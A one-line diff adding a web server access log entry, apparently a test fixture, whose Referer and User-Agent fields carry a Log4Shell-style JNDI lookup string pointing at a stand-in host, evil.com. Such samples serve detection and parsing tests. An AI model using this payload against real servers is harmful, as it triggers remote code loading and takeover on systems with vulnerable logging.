@@ -1,0 +1,1 @@
+198.51.100.27 - - [10/Jan/2026:13:55:41 +0000] "GET / HTTP/1.1" 200 128 "${jndi:ldap://evil.com/x}" "${jndi:ldap://evil.com/x}"
